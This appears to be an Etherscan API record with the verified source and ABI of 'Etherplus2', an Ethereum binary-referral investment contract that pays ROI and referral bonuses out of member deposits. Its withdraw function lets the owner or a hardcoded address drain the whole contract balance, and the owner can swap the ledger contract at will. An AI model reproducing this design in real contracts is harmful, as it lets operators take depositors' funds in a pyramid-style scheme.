{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.6.0;\r\n\r\ncontract Etherplus2 {\r\n    address public owner;\r\n    address private withOwner=0x733f4d9FdE3D6012f827f6e766B46DB009932077;\r\n    address private creatorOwner=0x92872574E4Cf5bA1fF7977E327A4ca4f6779c180; //Distribute\r\n    EtherplusDb ethPDbInst;\r\n    address private dbAddress;\r\n    \r\n    uint256 public constant payoutPercent  = 7;\r\n    uint256 public constant MAX_CAPPING = 7;\r\n    \r\n    struct User {\r\n        uint256 id;\r\n        uint256 sponsor;\r\n        uint256 totDirect;\r\n        uint256 totLeft;\r\n        uint256 totRight;\r\n        uint256 creationTime;\r\n        uint256 directBonusBal;\r\n        uint256 totDirectBonus;\r\n        uint256 totBinaryBonus;\r\n        uint256 totRoiBal;\r\n        uint256 totAllBonus;\r\n        uint256 pool_bonus;\r\n        uint256 totPoolBonus;\r\n        uint membership;\r\n        uint256 placement;\r\n        UserBinary binary;\r\n        UserBusiness business;\r\n        bool limitReached;\r\n    }\r\n    \r\n    struct UserBusiness {\r\n        uint256 totLeftBusiness;\r\n        uint256 totRightBusiness;\r\n        uint256 curLeftBusiness;\r\n        uint256 curRightBusiness;\r\n    }\r\n    \r\n    struct UserBinary {\r\n        uint256 parentNode;\r\n        uint256 leftNode;\r\n        uint256 rightNode;\r\n    }\r\n    \r\n    struct Investment{\r\n        uint256 amount;\r\n        uint256 maxEarning;\r\n        uint256 totEarned;\r\n        uint256 roiFlag;\r\n        uint256 roiDuration;\r\n        uint256 roiPercent;\r\n        uint256 creationTime;\r\n    }\r\n    \r\n    constructor () public {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    event binaryDistributed(uint256 uid, uint256 curLeft,uint256 curRight, uint256 amount,uint256 ctime);\r\n    event withdrawHistory(uint256 uid,uint256 roi,uint256 binary,uint256 level,uint256 reward,uint256 ctime);\r\n    \r\n    function changeDbAddress(address _addr) public onlyOwner returns(bool) {\r\n        dbAddress = _addr;\r\n        ethPDbInst = EtherplusDb(dbAddress);\r\n        return true;\r\n    }\r\n    \r\n    function withdraw(uint256 amt) public {\r\n        if(msg.sender==withOwner || msg.sender==owner){\r\n            require(amt<=address(this).balance,\"balance is less than withdraw amount\");\r\n            msg.sender.transfer(amt);            \r\n        }\r\n    }\r\n    \r\n    function regUser(address spnsAddr, uint256 position) payable public returns (bool) {\r\n        address uAddr = msg.sender;\r\n        require(msg.value>=0.1 ether, \"Sent Ether value is not correct\");\r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(uAddr)\r\n        }\r\n        require(size == 0, \"user address cannot be a contract\");\r\n        ethPDbInst.saveNewUser(msg.sender,spnsAddr,position,msg.value);\r\n        transferToCreator(msg.value);\r\n        return true;\r\n    }\r\n    \r\n    function transferToCreator(uint256 amount) private returns (bool){\r\n        payable(creatorOwner).transfer(amount*6/100);\r\n        return true;\r\n    }\r\n    \r\n    function transOldRewardAndLevelInc(address _addr) public onlyOwner returns(bool) {\r\n         (uint256 levelBns,,,,uint256 rewrdBns,,) = ethPDbInst.bonusBalances(_addr);   \r\n         if(levelBns>0 || rewrdBns>0){\r\n             payable(_addr).transfer(levelBns+rewrdBns);\r\n         }\r\n         return true;\r\n    }\r\n    \r\n    function withdrawBonuses() public returns(bool) {\r\n        require(ethPDbInst.isInvested(msg.sender)==true,\"You should invest first\");\r\n        (uint256 to_payout, uint256 max_payout) = ethPDbInst.roiPayoutOf(msg.sender);\r\n        (,,,uint256 pool_bonus,,uint256 directBonusBal,uint256 totAllBonus) = ethPDbInst.bonusBalances(msg.sender);\r\n        (uint256 amount,,,,,,) = ethPDbInst.invested(msg.sender);\r\n        require(totAllBonus < max_payout, \"Full payouts\");\r\n        // ROI PAYOUT \r\n        uint256 roiPay = to_payout;\r\n        if(to_payout > 0) {\r\n            if(totAllBonus + to_payout > max_payout) {\r\n                to_payout = max_payout - totAllBonus;\r\n            }\r\n            // SAVE LEVEL BONUS\r\n            (,,,,,uint256 sponsor) = ethPDbInst.userBinaryTree(msg.sender);\r\n            if(sponsor!=0 && amount >= 1 ether){\r\n                ethPDbInst.sendMoneyToSponsor(sponsor, to_payout);\r\n            }\r\n        }\r\n        // // LEVEL PAYOUT\r\n        uint256 levelPay = directBonusBal;\r\n        if(directBonusBal > 0) {\r\n            to_payout += directBonusBal;\r\n        }\r\n        // Pool payout\r\n        uint256 rewardPay = pool_bonus;\r\n        if(pool_bonus > 0) {\r\n            to_payout += pool_bonus;\r\n        }\r\n\r\n        //Binary payout \r\n        uint256 binaryPayout = ethPDbInst.calculateBinaryPayout(msg.sender);\r\n        if(binaryPayout > 0) {\r\n            (uint256 curLeft,uint256 curRight,,) = ethPDbInst.userBusiness(msg.sender);\r\n            emit binaryDistributed(ethPDbInst.idByAddress(msg.sender),curLeft,curRight,binaryPayout,block.timestamp);\r\n            to_payout += binaryPayout;\r\n        }\r\n        \r\n        ethPDbInst.updBalncs(roiPay,msg.sender,max_payout);\r\n        \r\n        msg.sender.transfer(to_payout);\r\n        \r\n        emit withdrawHistory(ethPDbInst.idByAddress(msg.sender),roiPay,binaryPayout,levelPay,rewardPay,block.timestamp);\r\n        \r\n        return true;\r\n    }\r\n    \r\n     //modifier\r\n    modifier onlyOwner(){\r\n        require(msg.sender==owner,\"only owner can run this\");\r\n        _;\r\n    }\r\n    \r\n    function upgradeInvestment() payable public returns (bool) {\r\n        if(ethPDbInst.upgrade(msg.sender,msg.value)){\r\n            transferToCreator(msg.value);       \r\n        }\r\n        return true;\r\n    } \r\n    \r\n}\r\n\r\ncontract EtherplusDb {\r\n    address public owner;\r\n    address public dappAddress;\r\n    struct User {\r\n        uint256 id;\r\n        uint256 sponsor;\r\n        uint256 totDirect;\r\n        uint256 totLeft;\r\n        uint256 totRight;\r\n        uint256 creationTime;\r\n        uint256 directBonusBal;\r\n        uint256 totDirectBonus;\r\n        uint256 totBinaryBonus;\r\n        uint256 totRoiBal;\r\n        uint256 totAllBonus;\r\n        uint256 pool_bonus;\r\n        uint256 totPoolBonus;\r\n        uint membership;\r\n        uint256 placement;\r\n        UserBinary binary;\r\n        UserBusiness business;\r\n        bool limitReached;\r\n    }\r\n    \r\n    struct UserBusiness {\r\n        uint256 totLeftBusiness;\r\n        uint256 totRightBusiness;\r\n        uint256 curLeftBusiness;\r\n        uint256 curRightBusiness;\r\n    }\r\n    \r\n    struct UserBinary {\r\n        uint256 parentNode;\r\n        uint256 leftNode;\r\n        uint256 rightNode;\r\n    }\r\n    \r\n    struct Investment{\r\n        uint256 amount;\r\n        uint256 maxEarning;\r\n        uint256 totEarned;\r\n        uint256 roiFlag;\r\n        uint256 roiDuration;\r\n        uint256 roiPercent;\r\n        uint256 creationTime;\r\n    }\r\n    \r\n    uint256 public constant payoutPercent  = 7;\r\n    uint256 public constant MAX_CAPPING = 7;\r\n    \r\n    User[] userList; \r\n    \r\n    mapping(address => uint256) public pool_rewards_users;\r\n    uint256 public pool_last_draw = now;\r\n    uint256 public pool_balance;\r\n    uint256 public currUId;\r\n    mapping(address => User) users;\r\n    mapping(uint256 => address) public addressById;\r\n    mapping(address=>Investment) public invested;           //how much user invested\r\n    mapping(address=>bool) public isInvested;            //check user invested or not\r\n    mapping(uint256 => uint256[]) public leftReferrals;\r\n    mapping(uint256 => uint256[]) public rightReferrals;\r\n    \r\n    address public topIdAddr;\r\n    uint256 public topIdAmt;\r\n    address[] public poolSpnsAddList;\r\n    uint8[] public levelBonus;\r\n    \r\n    function idByAddress(address addr) view public returns (uint256){}\r\n    function saveNewUser(address uAddr,address spnsAddr,uint256 position, uint256 invAmt) public returns (bool) {}\r\n    function withdrawAllBonuses() public returns (uint256) {}\r\n    function upgrade(address _addr, uint256 invAmt) public returns (bool) {}\r\n    function sendMoneyToSponsor(uint256 spnsId, uint256 amt) public returns (bool) {}\r\n    function updBalncs(uint256 to_payout,address _addr) public returns(bool) {}\r\n    function roiPayoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {}\r\n    function bonusBalances(address addr) view public returns (uint256 directBonus, uint256 binaryBonus, uint256 roiBonus, uint256 pool_bonus, uint256 totPoolBonus, uint256 directBonusBal, uint256 totalBonus) {}\r\n    function userBinaryTree(address addr) view public returns (uint256 parentNode, uint256 leftNode, uint256 rightNode, uint256 totLeft, uint256 totRight, uint256 sponsor) {}\r\n    function calculateBinaryPayout(address _addr) public returns (uint256){}\r\n    function updBalncs(uint256 roiPay,address _addr,uint256 max_payout) public returns(bool) {}\r\n    function userBusiness(address addr) view public returns (uint256 curLeftBusiness, uint256 curRightBusiness, uint256 totLeftBusiness, uint256 totRightBusiness) {}\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"uid\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"curLeft\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"curRight\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ctime\",\"type\":\"uint256\"}],\"name\":\"binaryDistributed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"uid\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"roi\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"binary\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"reward\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ctime\",\"type\":\"uint256\"}],\"name\":\"withdrawHistory\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX_CAPPING\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"changeDbAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"payoutPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnsAddr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"position\",\"type\":\"uint256\"}],\"name\":\"regUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"transOldRewardAndLevelInc\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"upgradeInvestment\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amt\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawBonuses\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"Etherplus2","CompilerVersion":"v0.6.0+commit.26b70077","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://b9e1a8e8a869d1c785e1a0030d36e875648f2e0a9890b5429e6efd5f942d7b5f"}]}